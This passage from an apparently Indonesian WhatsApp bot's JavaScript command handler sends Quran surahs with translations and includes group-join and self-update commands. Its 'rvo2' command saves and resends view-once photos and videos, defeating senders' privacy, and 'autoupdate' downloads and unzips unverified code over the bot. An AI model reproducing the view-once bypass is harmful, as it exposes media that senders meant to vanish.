وَمِنْهُمْ مَّنْ يُّؤْمِنُ بِهٖ وَمِنْهُمْ مَّنْ لَّا يُؤْمِنُ بِهٖ ۗ وَرَبُّكَ اَعْلَمُ بِالْمُفْسِدِيْنَ
وَاِنْ كَذَّبُوْكَ فَقُلْ لِّيْ عَمَلِيْ وَلَكُمْ عَمَلُكُمْ ۚ اَنْتُمْ بَرِيْۤـُٔوْنَ مِمَّآ اَعْمَلُ وَاَنَا۠ بَرِيْۤءٌ مِّمَّا تَعْمَلُوْنَ
وَمِنْهُمْ مَّنْ يَّسْتَمِعُوْنَ اِلَيْكَ ۗ اَفَاَنْتَ تُسْمِعُ الصُّمَّ وَلَوْ كَانُوْا لَا يَعْقِلُوْنَ
وَمِنْهُمْ مَّنْ يَّنْظُرُ اِلَيْكَ ۗ اَفَاَنْتَ تَهْدِى الْعُمْيَ وَلَوْ كَانُوْا لَا يُبْصِرُوْنَ
اِنَّ اللّٰهَ لَا يَظْلِمُ النَّاسَ شَيْـًٔا وَّلٰكِنَّ النَّاسَ اَنْفُسَهُمْ يَظْلِمُوْنَ
وَيَوْمَ يَحْشُرُهُمْ كَاَنْ لَّمْ يَلْبَثُوْٓا اِلَّا سَاعَةً مِّنَ النَّهَارِ يَتَعَارَفُوْنَ بَيْنَهُمْ ۗ قَدْ خَسِرَ الَّذِيْنَ كَذَّبُوْا بِلِقَاۤءِ اللّٰهِ وَمَا كَانُوْا مُهْتَدِيْنَ
وَاِمَّا نُرِيَنَّكَ بَعْضَ الَّذِيْ نَعِدُهُمْ اَوْ نَتَوَفَّيَنَّكَ فَاِلَيْنَا مَرْجِعُهُمْ ثُمَّ اللّٰهُ شَهِيْدٌ عَلٰى مَا يَفْعَلُوْنَ
وَلِكُلِّ اُمَّةٍ رَّسُوْلٌ ۚ فَاِذَا جَاۤءَ رَسُوْلُهُمْ قُضِيَ بَيْنَهُمْ بِالْقِسْطِ وَهُمْ لَا يُظْلَمُوْنَ
وَيَقُوْلُوْنَ مَتٰى هٰذَا الْوَعْدُ اِنْ كُنْتُمْ صٰدِقِيْنَ
قُلْ لَّآ اَمْلِكُ لِنَفْسِيْ ضَرًّا وَّلَا نَفْعًا اِلَّا مَا شَاۤءَ اللّٰهُ ۗ لِكُلِّ اُمَّةٍ اَجَلٌ ۗ اِذَا جَاۤءَ اَجَلُهُمْ فَلَا يَسْتَأْخِرُوْنَ سَاعَةً وَّلَا يَسْتَقْدِمُوْنَ
قُلْ اَرَءَيْتُمْ اِنْ اَتٰىكُمْ عَذَابُهٗ بَيَاتًا اَوْ نَهَارًا مَّاذَا يَسْتَعْجِلُ مِنْهُ الْمُجْرِمُوْنَ
اَثُمَّ اِذَا مَا وَقَعَ اٰمَنْتُمْ بِهٖ ۗ اٰلْـٰٔنَ وَقَدْ كُنْتُمْ بِهٖ تَسْتَعْجِلُوْنَ
ثُمَّ قِيْلَ لِلَّذِيْنَ ظَلَمُوْا ذُوْقُوْا عَذَابَ الْخُلْدِ ۚ هَلْ تُجْزَوْنَ اِلَّا بِمَا كُنْتُمْ تَكْسِبُوْنَ
وَيَسْتَنْۢبِـُٔوْنَكَ اَحَقٌّ هُوَ ۗ قُلْ اِيْ وَرَبِّيْٓ اِنَّهٗ لَحَقٌّ ۗ وَمَآ اَنْتُمْ بِمُعْجِزِيْنَ
وَلَوْ اَنَّ لِكُلِّ نَفْسٍ ظَلَمَتْ مَا فِى الْاَرْضِ لَافْتَدَتْ بِهٖ ۗ وَاَسَرُّوا النَّدَامَةَ لَمَّا رَاَوُا الْعَذَابَ ۚ وَقُضِيَ بَيْنَهُمْ بِالْقِسْطِ وَهُمْ لَا يُظْلَمُوْنَ
اَلَآ اِنَّ لِلّٰهِ مَا فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ اَلَآ اِنَّ وَعْدَ اللّٰهِ حَقٌّ وَّلٰكِنَّ اَكْثَرَهُمْ لَا يَعْلَمُوْنَ
هُوَ يُحْيٖ وَيُمِيْتُ وَاِلَيْهِ تُرْجَعُوْنَ
يٰٓاَيُّهَا النَّاسُ قَدْ جَاۤءَتْكُمْ مَّوْعِظَةٌ مِّنْ رَّبِّكُمْ وَشِفَاۤءٌ لِّمَا فِى الصُّدُوْرِ ۙ وَهُدًى وَّرَحْمَةٌ لِّلْمُؤْمِنِيْنَ
قُلْ بِفَضْلِ اللّٰهِ وَبِرَحْمَتِهٖ فَبِذٰلِكَ فَلْيَفْرَحُوْا ۗ هُوَ خَيْرٌ مِّمَّا يَجْمَعُوْنَ
قُلْ اَرَءَيْتُمْ مَّآ اَنْزَلَ اللّٰهُ لَكُمْ مِّنْ رِّزْقٍ فَجَعَلْتُمْ مِّنْهُ حَرَامًا وَّحَلٰلًا ۗ قُلْ اٰللّٰهُ اَذِنَ لَكُمْ اَمْ عَلَى اللّٰهِ تَفْتَرُوْنَ
وَمَا ظَنُّ الَّذِيْنَ يَفْتَرُوْنَ عَلَى اللّٰهِ الْكَذِبَ يَوْمَ الْقِيٰمَةِ ۗ اِنَّ اللّٰهَ لَذُوْ فَضْلٍ عَلَى النَّاسِ وَلٰكِنَّ اَكْثَرَهُمْ لَا يَشْكُرُوْنَ
وَمَا تَكُوْنُ فِيْ شَأْنٍ وَّمَا تَتْلُوْا مِنْهُ مِنْ قُرْاٰنٍ وَّلَا تَعْمَلُوْنَ مِنْ عَمَلٍ اِلَّا كُنَّا عَلَيْكُمْ شُهُوْدًا اِذْ تُفِيْضُوْنَ فِيْهِ ۗ وَمَا يَعْزُبُ عَنْ رَّبِّكَ مِنْ مِّثْقَالِ ذَرَّةٍ فِى الْاَرْضِ وَلَا فِى السَّمَاۤءِ وَلَآ اَصْغَرَ مِنْ ذٰلِكَ وَلَآ اَكْبَرَ اِلَّا فِيْ كِتٰبٍ مُّبِيْنٍ
اَلَآ اِنَّ اَوْلِيَاۤءَ اللّٰهِ لَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
اَلَّذِيْنَ اٰمَنُوْا وَكَانُوْا يَتَّقُوْنَ
لَهُمُ الْبُشْرٰى فِى الْحَيٰوةِ الدُّنْيَا وَفِى الْاٰخِرَةِ ۗ لَا تَبْدِيْلَ لِكَلِمٰتِ اللّٰهِ ۗ ذٰلِكَ هُوَ الْفَوْزُ الْعَظِيْمُ
وَلَا يَحْزُنْكَ قَوْلُهُمْ ۘ اِنَّ الْعِزَّةَ لِلّٰهِ جَمِيْعًا ۗ هُوَ السَّمِيْعُ الْعَلِيْمُ
اَلَآ اِنَّ لِلّٰهِ مَنْ فِى السَّمٰوٰتِ وَمَنْ فِى الْاَرْضِ ۗ وَمَا يَتَّبِعُ الَّذِيْنَ يَدْعُوْنَ مِنْ دُوْنِ اللّٰهِ شُرَكَاۤءَ ۗ اِنْ يَّتَّبِعُوْنَ اِلَّا الظَّنَّ وَاِنْ هُمْ اِلَّا يَخْرُصُوْنَ
هُوَ الَّذِيْ جَعَلَ لَكُمُ الَّيْلَ لِتَسْكُنُوْا فِيْهِ وَالنَّهَارَ مُبْصِرًا ۗ اِنَّ فِيْ ذٰلِكَ لَاٰيٰتٍ لِّقَوْمٍ يَّسْمَعُوْنَ
قَالُوا اتَّخَذَ اللّٰهُ وَلَدًا سُبْحٰنَهٗ ۗ هُوَ الْغَنِيُّ ۗ لَهٗ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ اِنْ عِنْدَكُمْ مِّنْ سُلْطٰنٍۢ بِهٰذَا ۗ اَتَقُوْلُوْنَ عَلَى اللّٰهِ مَا لَا تَعْلَمُوْنَ
قُلْ اِنَّ الَّذِيْنَ يَفْتَرُوْنَ عَلَى اللّٰهِ الْكَذِبَ لَا يُفْلِحُوْنَ
مَتَاعٌ فِى الدُّنْيَا ثُمَّ اِلَيْنَا مَرْجِعُهُمْ ثُمَّ نُذِيْقُهُمُ الْعَذَابَ الشَّدِيْدَ بِمَا كَانُوْا يَكْفُرُوْنَ
وَاتْلُ عَلَيْهِمْ نَبَاَ نُوْحٍ ۘ اِذْ قَالَ لِقَوْمِهٖ يٰقَوْمِ اِنْ كَانَ كَبُرَ عَلَيْكُمْ مَّقَامِيْ وَتَذْكِيْرِيْ بِاٰيٰتِ اللّٰهِ فَعَلَى اللّٰهِ تَوَكَّلْتُ فَاَجْمِعُوْٓا اَمْرَكُمْ وَشُرَكَاۤءَكُمْ ثُمَّ لَا يَكُنْ اَمْرُكُمْ عَلَيْكُمْ غُمَّةً ثُمَّ اقْضُوْٓا اِلَيَّ وَلَا تُنْظِرُوْنِ
فَاِنْ تَوَلَّيْتُمْ فَمَا سَاَلْتُكُمْ مِّنْ اَجْرٍ ۗ اِنْ اَجْرِيَ اِلَّا عَلَى اللّٰهِ ۙ وَاُمِرْتُ اَنْ اَكُوْنَ مِنَ الْمُسْلِمِيْنَ
فَكَذَّبُوْهُ فَنَجَّيْنٰهُ وَمَنْ مَّعَهٗ فِى الْفُلْكِ وَجَعَلْنٰهُمْ خَلٰۤىِٕفَ وَاَغْرَقْنَا الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا ۚ فَانْظُرْ كَيْفَ كَانَ عَاقِبَةُ الْمُنْذَرِيْنَ
ثُمَّ بَعَثْنَا مِنْۢ بَعْدِهٖ رُسُلًا اِلٰى قَوْمِهِمْ فَجَاۤءُوْهُمْ بِالْبَيِّنٰتِ فَمَا كَانُوْا لِيُؤْمِنُوْا بِمَا كَذَّبُوْا بِهٖ مِنْ قَبْلُ ۗ كَذٰلِكَ نَطْبَعُ عَلٰى قُلُوْبِ الْمُعْتَدِيْنَ
ثُمَّ بَعَثْنَا مِنْۢ بَعْدِهِمْ مُّوْسٰى وَهٰرُوْنَ اِلٰى فِرْعَوْنَ وَمَلَا۟ىِٕهٖ بِاٰيٰتِنَا فَاسْتَكْبَرُوْا وَكَانُوْا قَوْمًا مُّجْرِمِيْنَ
فَلَمَّا جَاۤءَهُمُ الْحَقُّ مِنْ عِنْدِنَا قَالُوْٓا اِنَّ هٰذَا لَسِحْرٌ مُّبِيْنٌ
قَالَ مُوْسٰىٓ اَتَقُوْلُوْنَ لِلْحَقِّ لَمَّا جَاۤءَكُمْ ۗ اَسِحْرٌ هٰذَا ۗ وَلَا يُفْلِحُ السّٰحِرُوْنَ
قَالُوْٓا اَجِئْتَنَا لِتَلْفِتَنَا عَمَّا وَجَدْنَا عَلَيْهِ اٰبَاۤءَنَا وَتَكُوْنَ لَكُمَا الْكِبْرِيَاۤءُ فِى الْاَرْضِ ۗ وَمَا نَحْنُ لَكُمَا بِمُؤْمِنِيْنَ
وَقَالَ فِرْعَوْنُ ائْتُوْنِيْ بِكُلِّ سٰحِرٍ عَلِيْمٍ
فَلَمَّا جَاۤءَ السَّحَرَةُ قَالَ لَهُمْ مُّوْسٰىٓ اَلْقُوْا مَآ اَنْتُمْ مُّلْقُوْنَ
فَلَمَّآ اَلْقَوْا قَالَ مُوْسٰى مَا جِئْتُمْ بِهِ السِّحْرُ ۗ اِنَّ اللّٰهَ سَيُبْطِلُهٗ ۗ اِنَّ اللّٰهَ لَا يُصْلِحُ عَمَلَ الْمُفْسِدِيْنَ
وَيُحِقُّ اللّٰهُ الْحَقَّ بِكَلِمٰتِهٖ وَلَوْ كَرِهَ الْمُجْرِمُوْنَ
فَمَآ اٰمَنَ لِمُوْسٰىٓ اِلَّا ذُرِّيَّةٌ مِّنْ قَوْمِهٖ عَلٰى خَوْفٍ مِّنْ فِرْعَوْنَ وَمَلَا۟ىِٕهِمْ اَنْ يَّفْتِنَهُمْ ۗ وَاِنَّ فِرْعَوْنَ لَعَالٍ فِى الْاَرْضِ ۚ وَاِنَّهٗ لَمِنَ الْمُسْرِفِيْنَ
وَقَالَ مُوْسٰى يٰقَوْمِ اِنْ كُنْتُمْ اٰمَنْتُمْ بِاللّٰهِ فَعَلَيْهِ تَوَكَّلُوْٓا اِنْ كُنْتُمْ مُّسْلِمِيْنَ
فَقَالُوْا عَلَى اللّٰهِ تَوَكَّلْنَا ۚ رَبَّنَا لَا تَجْعَلْنَا فِتْنَةً لِّلْقَوْمِ الظّٰلِمِيْنَ
وَنَجِّنَا بِرَحْمَتِكَ مِنَ الْقَوْمِ الْكٰفِرِيْنَ
وَاَوْحَيْنَآ اِلٰى مُوْسٰى وَاَخِيْهِ اَنْ تَبَوَّاٰ لِقَوْمِكُمَا بِمِصْرَ بُيُوْتًا وَّاجْعَلُوْا بُيُوْتَكُمْ قِبْلَةً وَّاَقِيْمُوا الصَّلٰوةَ ۗ وَبَشِّرِ الْمُؤْمِنِيْنَ
وَقَالَ مُوْسٰى رَبَّنَآ اِنَّكَ اٰتَيْتَ فِرْعَوْنَ وَمَلَا۟ىِٕهٖ زِيْنَةً وَّاَمْوَالًا فِى الْحَيٰوةِ الدُّنْيَا ۙ رَبَّنَا لِيُضِلُّوْا عَنْ سَبِيْلِكَ ۚ رَبَّنَا اطْمِسْ عَلٰٓى اَمْوَالِهِمْ وَاشْدُدْ عَلٰى قُلُوْبِهِمْ فَلَا يُؤْمِنُوْا حَتّٰى يَرَوُا الْعَذَابَ الْاَلِيْمَ
قَالَ قَدْ اُجِيْبَتْ دَّعْوَتُكُمَا فَاسْتَقِيْمَا وَلَا تَتَّبِعٰٓنِّ سَبِيْلَ الَّذِيْنَ لَا يَعْلَمُوْنَ
وَجَاوَزْنَا بِبَنِيْٓ اِسْرَاۤءِيْلَ الْبَحْرَ فَاَتْبَعَهُمْ فِرْعَوْنُ وَجُنُوْدُهٗ بَغْيًا وَّعَدْوًا ۗ حَتّٰىٓ اِذَآ اَدْرَكَهُ الْغَرَقُ قَالَ اٰمَنْتُ اَنَّهٗ لَآ اِلٰهَ اِلَّا الَّذِيْٓ اٰمَنَتْ بِهٖ بَنُوْٓا اِسْرَاۤءِيْلَ وَاَنَا۠ مِنَ الْمُسْلِمِيْنَ
اٰلْـٰٔنَ وَقَدْ عَصَيْتَ قَبْلُ وَكُنْتَ مِنَ الْمُفْسِدِيْنَ
فَالْيَوْمَ نُنَجِّيْكَ بِبَدَنِكَ لِتَكُوْنَ لِمَنْ خَلْفَكَ اٰيَةً ۗ وَاِنَّ كَثِيْرًا مِّنَ النَّاسِ عَنْ اٰيٰتِنَا لَغٰفِلُوْنَ
وَلَقَدْ بَوَّأْنَا بَنِيْٓ اِسْرَاۤءِيْلَ مُبَوَّاَ صِدْقٍ وَّرَزَقْنٰهُمْ مِّنَ الطَّيِّبٰتِ ۚ فَمَا اخْتَلَفُوْا حَتّٰى جَاۤءَهُمُ الْعِلْمُ ۗ اِنَّ رَبَّكَ يَقْضِيْ بَيْنَهُمْ يَوْمَ الْقِيٰمَةِ فِيْمَا كَانُوْا فِيْهِ يَخْتَلِفُوْنَ
فَاِنْ كُنْتَ فِيْ شَكٍّ مِّمَّآ اَنْزَلْنَآ اِلَيْكَ فَسْـَٔلِ الَّذِيْنَ يَقْرَءُوْنَ الْكِتٰبَ مِنْ قَبْلِكَ ۚ لَقَدْ جَاۤءَكَ الْحَقُّ مِنْ رَّبِّكَ فَلَا تَكُوْنَنَّ مِنَ الْمُمْتَرِيْنَ
وَلَا تَكُوْنَنَّ مِنَ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِ اللّٰهِ فَتَكُوْنَ مِنَ الْخٰسِرِيْنَ
اِنَّ الَّذِيْنَ حَقَّتْ عَلَيْهِمْ كَلِمَتُ رَبِّكَ لَا يُؤْمِنُوْنَ
وَلَوْ جَاۤءَتْهُمْ كُلُّ اٰيَةٍ حَتّٰى يَرَوُا الْعَذَابَ الْاَلِيْمَ
فَلَوْلَا كَانَتْ قَرْيَةٌ اٰمَنَتْ فَنَفَعَهَآ اِيْمَانُهَآ اِلَّا قَوْمَ يُوْنُسَ ۗ لَمَّآ اٰمَنُوْا كَشَفْنَا عَنْهُمْ عَذَابَ الْخِزْيِ فِى الْحَيٰوةِ الدُّنْيَا وَمَتَّعْنٰهُمْ اِلٰى حِيْنٍ
وَلَوْ شَاۤءَ رَبُّكَ لَاٰمَنَ مَنْ فِى الْاَرْضِ كُلُّهُمْ جَمِيْعًا ۗ اَفَاَنْتَ تُكْرِهُ النَّاسَ حَتّٰى يَكُوْنُوْا مُؤْمِنِيْنَ
وَمَا كَانَ لِنَفْسٍ اَنْ تُؤْمِنَ اِلَّا بِاِذْنِ اللّٰهِ ۗ وَيَجْعَلُ الرِّجْسَ عَلَى الَّذِيْنَ لَا يَعْقِلُوْنَ
قُلِ انْظُرُوْا مَاذَا فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ وَمَا تُغْنِى الْاٰيٰتُ وَالنُّذُرُ عَنْ قَوْمٍ لَّا يُؤْمِنُوْنَ
فَهَلْ يَنْتَظِرُوْنَ اِلَّا مِثْلَ اَيَّامِ الَّذِيْنَ خَلَوْا مِنْ قَبْلِهِمْ ۗ قُلْ فَانْتَظِرُوْٓا اِنِّيْ مَعَكُمْ مِّنَ الْمُنْتَظِرِيْنَ
ثُمَّ نُنَجِّيْ رُسُلَنَا وَالَّذِيْنَ اٰمَنُوْا ۗ كَذٰلِكَ ۛ حَقًّا عَلَيْنَا نُنْجِ الْمُؤْمِنِيْنَ
قُلْ يٰٓاَيُّهَا النَّاسُ اِنْ كُنْتُمْ فِيْ شَكٍّ مِّنْ دِيْنِيْ فَلَآ اَعْبُدُ الَّذِيْنَ تَعْبُدُوْنَ مِنْ دُوْنِ اللّٰهِ وَلٰكِنْ اَعْبُدُ اللّٰهَ الَّذِيْ يَتَوَفّٰىكُمْ ۖ وَاُمِرْتُ اَنْ اَكُوْنَ مِنَ الْمُؤْمِنِيْنَ
وَاَنْ اَقِمْ وَجْهَكَ لِلدِّيْنِ حَنِيْفًا ۚ وَلَا تَكُوْنَنَّ مِنَ الْمُشْرِكِيْنَ
وَلَا تَدْعُ مِنْ دُوْنِ اللّٰهِ مَا لَا يَنْفَعُكَ وَلَا يَضُرُّكَ ۚ فَاِنْ فَعَلْتَ فَاِنَّكَ اِذًا مِّنَ الظّٰلِمِيْنَ
وَاِنْ يَّمْسَسْكَ اللّٰهُ بِضُرٍّ فَلَا كَاشِفَ لَهٗٓ اِلَّا هُوَ ۚ وَاِنْ يُّرِدْكَ بِخَيْرٍ فَلَا رَاۤدَّ لِفَضْلِهٖ ۗ يُصِيْبُ بِهٖ مَنْ يَّشَاۤءُ مِنْ عِبَادِهٖ ۗ وَهُوَ الْغَفُوْرُ الرَّحِيْمُ
قُلْ يٰٓاَيُّهَا النَّاسُ قَدْ جَاۤءَكُمُ الْحَقُّ مِنْ رَّبِّكُمْ ۚ فَمَنِ اهْتَدٰى فَاِنَّمَا يَهْتَدِيْ لِنَفْسِهٖ ۚ وَمَنْ ضَلَّ فَاِنَّمَا يَضِلُّ عَلَيْهَا ۚ وَمَآ اَنَا۠ عَلَيْكُمْ بِوَكِيْلٍ
وَاتَّبِعْ مَا يُوْحٰٓى اِلَيْكَ وَاصْبِرْ حَتّٰى يَحْكُمَ اللّٰهُ ۚ وَهُوَ خَيْرُ الْحٰكِمِيْنَ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐘𝐔𝐍𝐔𝐒",
 url: `https://quran.com/10`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© YUNUS"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© YUNUS",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 1-109", id: `${prefix}yunus` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'alikhlas': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗜𝗞𝗛𝗟𝗔𝗦\`
Surat ke-112 | 4 ayat | Makkiyah | Ikhlas

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
قُلْ هُوَ اللَّهُ أَحَدٌ
اللَّهُ الصَّمَدُ
لَمْ يَلِدْ وَلَمْ يُولَدْ
وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Katakanlah: "Dia-lah Allah, Yang Maha Esa."
2. Allah tempat bergantung segala sesuatu.
3. Dia tidak beranak dan tidak pula diperanakkan.
4. Dan tidak ada seorang pun yang setara dengan Dia.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'alfalaq': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗙𝗔𝗟𝗔𝗤\`
Surat ke-113 | 5 ayat | Makkiyah | Waktu Subuh

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
قُلْ أَعُوذُ بِرَبِّ الْفَلَقِ
مِن شَرِّ مَا خَلَقَ
وَمِن شَرِّ غَاسِقٍ إِذَا وَقَبَ
وَمِن شَرِّ النَّفَّاثَاتِ فِي الْعُقَدِ
وَمِن شَرِّ حَاسِدٍ إِذَا حَسَدَ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Katakanlah: "Aku berlindung kepada Tuhan yang menguasai subuh,
2. dari kejahatan makhluk-Nya,
3. dan dari kejahatan malam apabila telah gelap gulita,
4. dan dari kejahatan wanita-wanita tukang sihir yang menghembus pada buhul-buhul,
5. dan dari kejahatan orang yang dengki apabila dia dengki."

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'annas': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗡-𝗡𝗔𝗦\`
Surat ke-114 | 6 ayat | Makkiyah | Manusia

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
قُلْ أَعُوذُ بِرَبِّ النَّاسِ
مَلِكِ النَّاسِ
إِلَٰهِ النَّاسِ
مِن شَرِّ الْوَسْوَاسِ الْخَنَّاسِ
الَّذِي يُوَسْوِسُ فِي صُدُورِ النَّاسِ
مِنَ الْجِنَّةِ وَالنَّاسِ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Katakanlah: "Aku berlindung kepada Tuhan manusia,
2. Raja manusia,
3. Sembahan manusia,
4. dari kejahatan bisikan syaitan yang biasa bersembunyi,
5. yang membisikkan ke dalam dada manusia,
6. dari jin dan manusia."

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case 'alkausar': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗞𝗔𝗨𝗦𝗔𝗥\`
Surat ke-108 | 3 ayat | Makkiyah | Nikmat yang Berlimpah

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁\`
إِنَّا أَعْطَيْنَاكَ الْكَوْثَرَ
فَصَلِّ لِرَبِّكَ وَانْحَرْ
إِنَّ شَانِئَكَ هُوَ الْأَبْتَرُ

⌲ \`𝐀𝐑𝐓𝐈𝐍𝐘𝐀\`
1. Sesungguhnya Kami telah memberikan kepadamu nikmat yang banyak.
2. Maka dirikanlah shalat karena Tuhanmu, dan berkorbanlah.
3. Sesungguhnya orang-orang yang membenci kamu dialah yang terputus.

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 await Asepp.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "autoupdate": {
 if (!isOwner) return payreply(mess.owner)

 let { exec } = require('child_process')
 let axios = require('axios')

 const GITHUB_OWNER = `AsepXyz12`
 const GITHUB_REPO = `bot-wa-db`
 const branch = 'main'

 payreply("🔄 Download update dari GitHub...")

 try {
 let url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/zipball/${branch}`
 let res = await axios.get(url, {
 headers: {
 'User-Agent': 'Asepp-Bot'
 },
 responseType: 'arraybuffer'
 })

 require('fs').writeFileSync('./update.zip', res.data)

 exec('unzip -o update.zip && rm -rf update.zip', async (err) => {
 if (err) return payreply(`❌ Gagal extract: ${err.message}`)

 payreply("✅ Update selesai!\n🔄 Restart bot...")
 setTimeout(() => process.exit(1), 2000)
 })

 } catch (e) {
 payreply(`❌ Gagal update:\n${e.message}`)
 }
}
break

case "rvo2": {
 if (!m.quoted) return payreply("❌ *Reply Foto/Videonya Dulu Beb*")

 const q = m.quoted
 if (!q.viewOnce)
 return payreply("❌ *Itu Bukan Pesan Sekali Lihat Beb*")

 try {
 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 const media = await q.download()
 const type = q.mtype === "viewOnceMessageV2"
 ? q.message.viewOnceMessageV2.message.imageMessage
 ? "image"
 : "video"
 : q.mtype.replace("Message", "")

 const prettyCaption = q.text
 ? `🩸 *RVO EXTRACTED*\n\n` +
 `┌ ◦ Tipe : ${type.toUpperCase()}\n` +
 `├ ◦ Status : Berhasil\n` +
 `└ ◦ Caption :\n${q.text}\n\n` +
 `_~ Media bebas view once, gas simpen_`
 : `🩸 *RVO EXTRACTED*\n\n` +
 `┌ ◦ Tipe : ${type.toUpperCase()}\n` +
 `├ ◦ Status : Berhasil\n` +
 `└ ◦ Caption : -\n\n` +
 `_~ Media bebas view once, gas simpen_`

 await Asepp.sendMessage(
 m.chat,
 {
 [type]: media,
 caption: prettyCaption
 },
 { quoted: m }
 )

 await Asepp.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

 } catch (err) {
 console.error(err)
 payreply("❌ *Gagal Membuka View Once Beb*\n_Mungkin udah kadaluarsa atau error_")
 await Asepp.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
 }
}
break

case "joingc": {
 if (!args[0]) {
 return Asepp.sendMessage(m.chat, {
 text: "❌ *Kirim link grupnya beb*\nContoh: `.joingc https://chat.whatsapp.com/xxxxx`"
 }, { quoted: m })
 }

 if (!args[0].includes("chat.whatsapp.com")) {
 return Asepp.sendMessage(m.chat, {
 text: "❌ *Link nya gak valid beb*\nPastiin link nya dari WhatsApp"
 }, { quoted: m })
 }

 try {
 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 // Ambil kode invite dari link
 const code = args[0].split("chat.whatsapp.com/")[1]
 if (!code) throw new Error("Kode invite gak ketemu")

 // Join grup
 const res = await Asepp.groupAcceptInvite(code)

 await Asepp.sendMessage(m.chat, {
 text: `✅ *Berhasil join grup*\n\n` +
 `🆔 ID Grup: ${res}\n` +
 `_Bot udah masuk beb, gasan_`
 }, { quoted: m })

 await Asepp.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

 } catch (err) {
 console.error("JoinGC Error:", err)
 let errorMsg = "❌ *Gagal join grup beb*"

 if (err.message.includes("already")) {
 errorMsg = "⚠️ *Bot udah ada di grup itu beb*"
 } else if (err.message.includes("invalid")) {
 errorMsg = "❌ *Link grup invalid atau udah expired*"
 } else if (err.message.includes("not-authorized")) {
 errorMsg = "❌ *Bot gak bisa join. Mungkin grup private*"
 }

 await Asepp.sendMessage(m.chat, { text: errorMsg }, { quoted: m })
 await Asepp.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
 }
}
break

case 'wkwkwk' :
case 'wkwkwkwk' :
case 'wk' :
case 'haha' :
